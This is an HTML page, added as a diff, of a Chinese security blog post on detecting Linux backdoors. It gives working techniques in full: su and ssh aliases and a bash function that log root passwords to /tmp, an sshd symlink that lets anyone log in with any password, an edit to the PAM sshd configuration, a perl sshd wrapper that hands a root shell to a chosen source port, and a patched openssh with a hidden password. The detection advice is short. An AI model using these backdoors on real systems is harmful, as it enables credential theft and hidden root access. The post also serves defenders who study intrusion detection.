@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="He1m4n6a的博客">
+    <meta name="keyword"  content="腾讯">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        反入侵策略总结-后门检测 - He1m4n6a的博客 | He1m4n6a&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 路漫漫其修远兮，吾将上下而求索。 </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>He1m4n6a</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#su后门"><span class="toc-text">su后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-别名"><span class="toc-text">1.1 别名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-bash脚本"><span class="toc-text">1.2 bash脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-C程序"><span class="toc-text">1.3 C程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测"><span class="toc-text">检测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PAM后门"><span class="toc-text">PAM后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-什么是PAM"><span class="toc-text">2.1 什么是PAM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-PAM文件配置语法"><span class="toc-text">2.2 PAM文件配置语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#module-type"><span class="toc-text">module-type</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#control-flag"><span class="toc-text">control-flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#module-path"><span class="toc-text">module-path</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#module-options"><span class="toc-text">module-options</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-PAM各模块功能"><span class="toc-text">2.3 PAM各模块功能</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-后门代码"><span class="toc-text">2.4 后门代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测-1"><span class="toc-text">检测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSH后门"><span class="toc-text">SSH后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-ssh软连接"><span class="toc-text">3.1 ssh软连接</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检测-2"><span class="toc-text">检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-SSH配置后门"><span class="toc-text">3.2 SSH配置后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检测-3"><span class="toc-text">检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-ssh命令后门"><span class="toc-text">3.3 ssh命令后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检测-4"><span class="toc-text">检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-ssh-wrapper后门"><span class="toc-text">3.4 ssh wrapper后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检测-5"><span class="toc-text">检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-openssh后门"><span class="toc-text">3.5 openssh后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检测-6"><span class="toc-text">检测</span></a></li></ol></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 路漫漫其修远兮，吾将上下而求索。 </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        反入侵策略总结-后门检测
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-07-01 22:17:19</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#后门" title="后门">后门</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#su" title="su">su</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#pam" title="pam">pam</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h1 id="su后门"><a href="#su后门" class="headerlink" title="su后门"></a>su后门</h1><h2 id="1-1-别名"><a href="#1-1-别名" class="headerlink" title="1.1 别名"></a>1.1 别名</h2><p>在bashrc等文件配置<code>alias su= &#39;strace -o /tmp/supwd-date &#39;+%d%h%m%s&#39;.log -e read,write,connect -s2048 su</code></p>
+<h2 id="1-2-bash脚本"><a href="#1-2-bash脚本" class="headerlink" title="1.2 bash脚本"></a>1.2 bash脚本</h2><p>编写su函数替代正常的su命令(如放入.bashrc中，普通用户登录时即生效)，当普通用户使用su切换到root时，su函数会记录用户参数。</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">function su()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    local arg_list=("" "-" "-l" "--login"</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    "-c" "--command" "--session-command"</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    "-f" "--fast"</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    "-m" "--preserve-environment" "-p"</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    "-s" "--shell=SHELL")</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    local flag=0 tmp_arg arg pass</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    if [ $UID -eq 0 ]; then</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        /bin/su $1; unset su ; return $?</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    fi</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    for arg in $&#123;arg_list[@]&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    do</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    [ "$1" = "$arg" ] &amp;&amp; flag=1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    done</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    [ $# -eq 0 ] &amp;&amp; flag=1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    tmp_arg=$1;tmp_arg=$&#123;tmp_arg:0:1&#125;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">    [ "$tmp_arg" != "-" -a $flag -eq 0 ] &amp;&amp; flag=1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    if [ $flag -ne 1 ];then</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        /bin/su $1; return $?</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    fi</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">    [ ! -f /tmp/... ] &amp;&amp; `touch /tmp/... &amp;&amp; chmod 777 /tmp/... &gt;/dev/null 2&gt;&amp;1`</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">    echo -ne "Password:\r\033[?25l"</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    read -t 30 -s pass</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">    echo -ne "\033[K\033[?25h"</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">    /bin/su &amp;&amp; unset su &amp;&amp; =echo $pass &gt;&gt; /tmp/...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+
+<h2 id="1-3-C程序"><a href="#1-3-C程序" class="headerlink" title="1.3 C程序"></a>1.3 C程序</h2><p><a href="https://github.com/stanleyb0y/sushell向su传递密码参数的程序实现偷取root密码。" target="_blank" rel="noopener">https://github.com/stanleyb0y/sushell向su传递密码参数的程序实现偷取root密码。</a></p>
+<p>下载解包后make编译出一个二进制pty用来向/bin/su传递参数，sushell是后门脚本。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">cp pty /tmp/.su</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">cp sushell /tmp/.X1-unix</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">echo alias su=/tmp/.X1-unix &gt;&gt; ~/.bashrc</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">后门脚本/tmp/.X1-unix内容：</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">echo -ne "Password:\c"</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">read -t 30 -s pass</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">echo "$pass" &gt;&gt; /tmp/...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">/tmp/.su -p "$pass" /bin/su $*</span></pre></td></tr></table></figure>
+
+<h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><ol>
+<li>监控<code>/bin/su</code>是否被更改</li>
+<li>监控配置文件<code>bashrc</code>和<code>profile</code>文件里是有有su的别名</li>
+</ol>
+<h1 id="PAM后门"><a href="#PAM后门" class="headerlink" title="PAM后门"></a>PAM后门</h1><h2 id="2-1-什么是PAM"><a href="#2-1-什么是PAM" class="headerlink" title="2.1 什么是PAM"></a>2.1 什么是PAM</h2><p>Linux-PAM是可插入认证模块(Pluggable Authentication Modules)，PAM使用配置/etc/pam.d/下的文件，来管理对程序的认证方式。它提供了对所有服务进行认证的中央机制，如远程登录应用（login,ftp,telnet,ssh,ppp），本地应用程序su等。</p>
+<p><img src="/images/a18/1.png" alt="img"></p>
+<p>系统管理员通过PAM配置文件来制定不同应用程序的不同认证策略，具体来讲，系统是根据/etc/pam.d/下的各种服务配置文件，调用/lib/security下相应的模块，以加载<strong>动态链接库的形式</strong>实现需要的认证方式。</p>
+<p>应用程序开发者则可以通过在服务程序中使用<strong>PAM API函数(如pam_xxxx)</strong>来实现对认证方法的调用。</p>
+<h2 id="2-2-PAM文件配置语法"><a href="#2-2-PAM文件配置语法" class="headerlink" title="2.2 PAM文件配置语法"></a>2.2 PAM文件配置语法</h2><p><code>module-type</code> <code>control-flag</code> <code>module_path optional</code> </p>
+<p>在/etc/pam.d/下的文件中，与服务名称相对应的文件，为该服务的pam验证文件，例如服务为sshd，则在/etc/pam.d下存在sshd这个文件，里面包含sshd验证规则。其中有个一特殊的文件为other，如果有的服务与之没有向对应的文件，则对应other。</p>
+<h3 id="module-type"><a href="#module-type" class="headerlink" title="module-type"></a>module-type</h3><p>服务类型，即 auth、account、session 或 password。</p>
+<ul>
+<li><p>验证模块(auth)用于验证用户或设置/销毁凭证。 </p>
+</li>
+<li><p>帐户管理模块(account)将执行与访问、帐户及凭证有效期、密码限制/规则等有关的操作。 </p>
+</li>
+<li><p>会话管理模块(session)用于初始化和终止会话。</p>
+</li>
+<li><p>密码管理模块(passwd)将执行与密码更改/更新有关的操作。 </p>
+</li>
+</ul>
+<h3 id="control-flag"><a href="#control-flag" class="headerlink" title="control-flag"></a>control-flag</h3><p>用于指明在确定服务的集成成败值过程中模块所起的作用。有效的控制标志包括<code>include、optional、required、requisite 和 sufficient</code>。</p>
+<p><strong>Required：</strong>表示本模块必须返回成功才能通过认证，但是如果该模块返回失败的话，失败结果也不会立即通知用户，而是要等到同一stack 中的所有模块全部执行完毕再将失败结果返回给应用程序。可以认为是一个必要条件。 </p>
+<p><strong>Requisite：</strong>与required类似，该模块必须返回成功才能通过认证，但是一旦该模块返回失败，将不再执行同一stack内的任何模块，而是直 接将控制权返回给应用程序。是一个必要条件。 </p>
+<p><strong>Sufficient：</strong>表明本模块返回成功已经足以通过身份认证的要求，不必再执行同一stack内的其它模块，但是如果本模块返回失败的话可以 忽略。可以认为是一个充分条件。 </p>
+<p><strong>Optional：</strong>表明本模块是可选的，它的成功与否一般不会对身份认证起关键作用，其返回值一般被忽略。 </p>
+<h3 id="module-path"><a href="#module-path" class="headerlink" title="module-path"></a>module-path</h3><p>用于实现服务的库对象的路径，一般都只写库名，库的路径一般为/lib/security(32位)，/lib64/security或/lib/x86_64-linux-gnu/security (64位)</p>
+<h3 id="module-options"><a href="#module-options" class="headerlink" title="module-options"></a>module-options</h3><p>传递给服务模块的选项，可选。</p>
+<p>几个公用的参数：</p>
+<ul>
+<li><p><strong>debug</strong> 该模块应当用syslog( )将调试信息写入到系统日志文件中。 </p>
+</li>
+<li><p><strong>no_warn</strong> 表明该模块不应把警告信息发送给应用程序。 </p>
+</li>
+<li><p><strong>use_first_pass</strong> 表明该模块不能提示用户输入密码，而应使用前一个模块从用户那里得到的密码。 </p>
+</li>
+<li><p><strong>try_first_pass</strong> 表明该模块首先应当使用前一个模块从用户那里得到的密码，如果该密码验证不通过，再提示用户输入新的密码。 </p>
+</li>
+<li><p><strong>use_mapped_pass</strong> 该模块不能提示用户输入密码，而是使用映射过的密码。 </p>
+</li>
+<li><p><strong>expose_account</strong> 允许该模块显示用户的帐号名等信息，一般只能在安全的环境下使用，因为泄漏用户名会对安全造成一定程度的威胁。 </p>
+</li>
+</ul>
+<h2 id="2-3-PAM各模块功能"><a href="#2-3-PAM各模块功能" class="headerlink" title="2.3 PAM各模块功能"></a>2.3 PAM各模块功能</h2><ol>
+<li><p>pam_securetty.so</p>
+<ul>
+<li>类型：auth       </li>
+<li>作用：只对root有限定，限定root登陆的终端，系统默认的“安全”中断保存在/etc/securetty中。</li>
+</ul>
+</li>
+<li><p>pam_access.so</p>
+<ul>
+<li>类型：account</li>
+<li>作用：基于登录名，主机名或者所属域，ip地址或者网络<br> 终端编号(类似于/etc/securetty)。默认的配置文件为/etc/security/access.conf</li>
+</ul>
+</li>
+<li><p>pam_tally2.so</p>
+<ul>
+<li><p>类型:auth</p>
+</li>
+<li><p>作用：限制用户登录的功能， 用户登录验证失败达到一定次数然后限制用户登录。</p>
+</li>
+<li><p>锁定账户参数：</p>
+<ul>
+<li><p>onerr=[fail|succeed]:</p>
+</li>
+<li><p>file=/path/to/counter:当登陆超过允许次数时，日志保存的地方。默认的为/var/log/tallylog。当开启的时候，每当登陆失败一次，则会写入一次，使用pam_tally2 可以读出</p>
+</li>
+<li><p>audit:如果用户找不到，则把此用户名记录到日志中</p>
+</li>
+<li><p>silent：不输出任何信息</p>
+</li>
+<li><p>no_log_info：不进行日志记录</p>
+</li>
+<li><p>deny=N：当用户连续输错n次是，在第n+1次锁定该用户，没有 设定解锁解锁时间，则锁定之后需要手工解锁。</p>
+</li>
+<li><p>pam_tally.so -u username –reset</p>
+</li>
+<li><p>lock_time=n：当输入密码错误一次时，在N秒内不能再次登陆该账户。 </p>
+</li>
+<li><p>unlock_time=n：解锁时间，当账户被锁定时，过n秒时，该账户 被接触锁定(清空/var/log/tallylog中的相关信息)，配合deny参数使用 magic_root：当uid=0时，不会往/var/log/tallylog中写入计 数，即这个PAM不生效 even_deny_root：对root用户生效(不加magic_root参数，对 root也是不处理的) root_unlock_time=n:是针对even_deny_root的，root用户的解锁时间 每当用户成功登陆过一次后，/var/log/tallylog中关于这个用 户的记录就会清空。 </p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>pam_cracklib</p>
+<ul>
+<li>类型：password</li>
+<li>作用：限定更改密码的长度，复杂度等等。</li>
+<li>参数：<ul>
+<li>dubug:把修改密码的行为记录到日志中 </li>
+<li>retry=N:修改密码时，允许错误的次数，默认是1次 </li>
+<li>difok=N：新密码与旧密码不同的位数。如果超过一半不同，则通过验证，则忽略difok的设置 </li>
+<li>minlen=N:密码的最短长度 </li>
+<li>dcredit=N:至少有N的数字 </li>
+<li>ucredit=N：至少有N的大写字码 </li>
+<li>lcredit=N:至少有N个小写字母 </li>
+<li>ocredit=N:至少有N个特殊字符 </li>
+<li>minclass=N:密码组成的范围(数字，大小写字母，特殊字符) </li>
+<li>maxrepeat=N:最多与上一个密码重复  </li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>pam_limits.so</p>
+<ul>
+<li>类型：session</li>
+<li>作用：限制资源的使用，默认的配置文件为/etc/security/limits.conf是全局的，/etc/security/limits.d/下存放各个子文件</li>
+</ul>
+</li>
+<li><p>pam_listfile.so</p>
+<ul>
+<li>类型：auth</li>
+<li>作用：验证用户是否能够登陆</li>
+<li>参数：<ul>
+<li>item=[tty|user|rhost|ruser|group|shell]:控制的对象 </li>
+<li>sense=[allow|deny]：控制的方法 </li>
+<li>file=/path/filename:文件的路径，每个占一行 </li>
+<li>onerr=[succeed|fail]：指定某类事件发生时的返回值。  </li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li><p>实例：</p>
+<p>authrequired pam_listfile.soonerr=succeed item=user sense=deny file=/etc/ftpusers 保存在/etc/ftpusers中的用户，是不允许的。 </p>
+</li>
+</ul>
+<ol start="7">
+<li><p>pam_nologin.so</p>
+<ul>
+<li><p>类型：auth</p>
+</li>
+<li><p>作用：用于拒绝除root外的不同用户的登陆(当/etc/nologin存在，或者重新制定file的情况下)</p>
+</li>
+<li><p>参数：auth</p>
+<p>file=/path/nologin：如果文件存在，当拒绝用户登陆的时候，同时会输出该文件中保存的内容。默认文件为/etc/nologin。 </p>
+</li>
+</ul>
+</li>
+<li><p>pam_unix.so</p>
+<ul>
+<li>类型：auth</li>
+<li>作用：它会把密码与/etc/shadow中的哈希对比，对用户的进行最终认证。</li>
+</ul>
+</li>
+</ol>
+<h2 id="2-4-后门代码"><a href="#2-4-后门代码" class="headerlink" title="2.4 后门代码"></a>2.4 后门代码</h2><p>上面分析了各模块作用，我们的目标是修改pam_unix.so内的代码，加入总能通过认证并记录正确密码的后门代码。找到源码modules/pam_unix/pam_unix_auth.c::106的pam_sm_authenticate()函数，该函数内进行密码读取和验证。</p>
+<p>图中框起来的就是我们加入的后门代码，内置一个万能密码，同时在本地记录任意经过PAM认证的用户名密码对。当然此时可以用root权限做更多更隐蔽的记录，比如用curl把密码发送到远端某服务器，发送前可以对密码进行流密码加密，均可以在代码中自行实现。</p>
+<p><img src="/images/a18/2.png" alt="img"></p>
+<h2 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h2><p>监控<code>pam_unix.so</code>文件，看是否被篡改</p>
+<h1 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h1><h2 id="3-1-ssh软连接"><a href="#3-1-ssh软连接" class="headerlink" title="3.1 ssh软连接"></a>3.1 ssh软连接</h2><p>系统的sshd程序位于/usr/sbin/sshd，需要sshd_config中开启PAM认证（默认开启），使用ln将它软链接到别处、并且命名为/etc/pam.d/内存在的文件名，比如su、runuser，同时执行该链接（sshd服务需要root权限），指定监听端口：<code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555</code>。然后在其他机器上指定端口、任意可登陆用户就可以任意密码连接到受害机器。</p>
+<p><strong>原理：</strong></p>
+<p>su通过pam进行认证，认证的时候会去到/etc/pam.d中寻找同名文件，按照文件内定义的规则进行认证，如果不存在就按照该目录下sshd的规则（和正常默认情况下没区别）进行认证。</p>
+<p>比如/etc/pam.d下的su、runuser内都含有下面这样的规则：</p>
+<p><img src="/images/a18/3.png" alt="img"></p>
+<p>  PAM中的控制标记：</p>
+<p><img src="/images/a18/4.png" alt="img"></p>
+<p><code>/etc/pam.d/sshd</code>的pam认证使用了<code>required</code>，即要通过多个模块的验证才能完成登录。而su第一条规则就使用了<code>sufficient</code>，意味着只要满足<code>pam_rootok.so</code>的认证就可以登录。<strong>这个认证模块是认证你的UID是否为0，然后立即返回认证结果。</strong></p>
+<p>由于/tmp/su要打开端口本来就需要root用户运行，所以这里得到的就是<code>uid=0</code>。于是<code>pam_rootok.so</code>的认证总会通过，和用户名、密码都无关。</p>
+<h3 id="检测-2"><a href="#检测-2" class="headerlink" title="检测"></a>检测</h3><ol>
+<li><p>检查/etc/pam.d下的异常创建、写入</p>
+</li>
+<li><p>检查系统新开放的端口</p>
+</li>
+<li><p>检查系统新进程的文件类型、位置是否正确</p>
+</li>
+</ol>
+<h2 id="3-2-SSH配置后门"><a href="#3-2-SSH配置后门" class="headerlink" title="3.2 SSH配置后门"></a>3.2 SSH配置后门</h2><p>ssh认证流程规则写在<code>/etc/pam.d/sshd</code>中，具体语法和规则参考上一章节。根据这个规则，我们只需要把第一个auth后边的<code>required</code>改为<code>sufficient</code>就能使得PAM仅通过第一个认证后就跳过后续认证返回ssh登录成功的结果。</p>
+<p><img src="/images/a18/5.png" alt="img"></p>
+<h3 id="检测-3"><a href="#检测-3" class="headerlink" title="检测"></a>检测</h3><p>监控<code>/etc/pam.d/sshd</code>配置文件，看是否有变动</p>
+<h2 id="3-3-ssh命令后门"><a href="#3-3-ssh命令后门" class="headerlink" title="3.3 ssh命令后门"></a>3.3 ssh命令后门</h2><p><code>alias ssh=&#39;strace -o /tmp/sshpwd-</code>date ‘+%d%h%m%s’<code>.log -e read,write,connect -s2048 ssh&#39;</code></p>
+<p>设置别名，一般最好设置在<code>.bashrc</code>，才能让管理员登录该普通用户时命令立刻生效。  </p>
+<h3 id="检测-4"><a href="#检测-4" class="headerlink" title="检测"></a>检测</h3><p>检测<code>bashrc</code>和<code>profile</code>等文件是否设置了ssh别名。</p>
+<h2 id="3-4-ssh-wrapper后门"><a href="#3-4-ssh-wrapper后门" class="headerlink" title="3.4 ssh wrapper后门"></a>3.4 ssh wrapper后门</h2><p>这种后门实际是利用openssh的fork机制、重复执行后门脚本，在ssh认证之前反弹shell，不需要额外开启端口，也不会影响正常ssh登录用户。下面的脚本以perl为例，当然也可以使用python、shell等能实现同等功能的脚本进行替换。</p>
+<p>先cp /bin/sh /bin/sshd增加隐蔽性，把原本的/usr/sbin/sshd移动到/usr/bin/sshd。后门脚本放置在/usr/sbin/sshd并设置对应的权限，然后重启sshd服务，脚本内容如下：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span><span class="string">"/bin/sshd"</span><span class="keyword">if</span>(<span class="keyword">getpeername</span>(STDIN)=~<span class="regexp">/^..zf/</span>); <span class="keyword">exec</span>&#123;<span class="string">"/usr/bin/sshd"</span>&#125;<span class="string">"/usr/sbin/sshd"</span>,@ARGV;</span></pre></td></tr></table></figure>
+
+<p><strong>代码含义：</strong></p>
+<p>第一行， 如果当前文件句柄STDIN是一个socket，且socket的远程连接源端口是31334（网络字节序的大端表示中31334的16进制字符串为\x00\x00zf，正好匹配上perl正则..zf），则执行/bin/sshd，并结束当前程序运行（不会执行第二步），相当于反弹一个root shell给远程socket（因为sshd 是以root权限运行的）</p>
+<p>第二行 启动sshd (/usr/bin/sshd是真正的sshd)服务 ，凡是传递给/usr/sbin/sshd 后门脚本的参数都传递给真正的sshd。这一行保证了普通用户也可以正常使用ssh 服务，登录并不会有什么异常现象。</p>
+<p><strong>无需密码的原理：</strong></p>
+<p>这和OpenSSH 服务特性有关，OpenSSH 和其他的网络服务一样，都会fork一个子进程处理用户连接， 但是有一点和其他网络服务不一样，新fork的子进程不会直接处理用户连接，而是重新在子进程中重新运行自身，也就是<code>/usr/sbin/sshd</code>（就是OpenSSH自身二进制文件） ，所以用户的连接是被重新运行的<code>/usr/sbin/sshd</code> 实例给处理了。重新运行/usr/sbin/sshd 就会执行后门的第一行代码。从而反弹shell且无需认证。 对于新fork的子进程来说，文件句柄STDIN/STDOUT 就和当前的socket关联在一起了。</p>
+<h3 id="检测-5"><a href="#检测-5" class="headerlink" title="检测"></a>检测</h3><p>监控<code>/usr/sbin/sshd</code>完整性</p>
+<h2 id="3-5-openssh后门"><a href="#3-5-openssh后门" class="headerlink" title="3.5 openssh后门"></a>3.5 openssh后门</h2><p>openssh后门即重新编译ssh的源码，在原版的ssh替换成恶意的ssh。</p>
+<p>vim includes.h，插入记录登入的日志ILOG，插入记录ssh连接出去的日志OLOG，插入SECRETPW为后门密码：</p>
+<p><img src="/images/a18/6.png" alt="img"></p>
+<p>vim version.h修改ssh –V查询到的版本信息字符串：</p>
+<p><img src="/images/a18/7.png" alt="img"></p>
+<p><code>./configure &amp;&amp; make &amp;&amp; make install</code>编译整个项目，替换<code>/usr/bin/ssh</code>和<code>/usr/sbin/sshd</code></p>
+<h3 id="检测-6"><a href="#检测-6" class="headerlink" title="检测"></a>检测</h3><p>监控<code>/usr/bin/ssh</code>和<code>/usr/sbin/sshd</code>两个文件的完整性</p>
+
+        
+            <div class="donate-container">
+    <div class="donate-button">
+        <button id="donate-button">赞赏</button>
+    </div>
+    <div class="donate-img-container hide" id="donate-img-container">
+        <img id="donate-img" src="" data-src="/img/donate.jpg">
+        <p> 感谢鼓励 </p>
+    </div>
+</div>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="https://github.com/he1m4n6a" target="_blank" rel="noopener">github</a></span>
+        <span>/</span>
+        
+        <span><a href="https://weibo.com/u/1736968374" target="_blank" rel="noopener">weibo</a></span>
+        <span>/</span>
+        
+        <span><a href="#">wechat</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
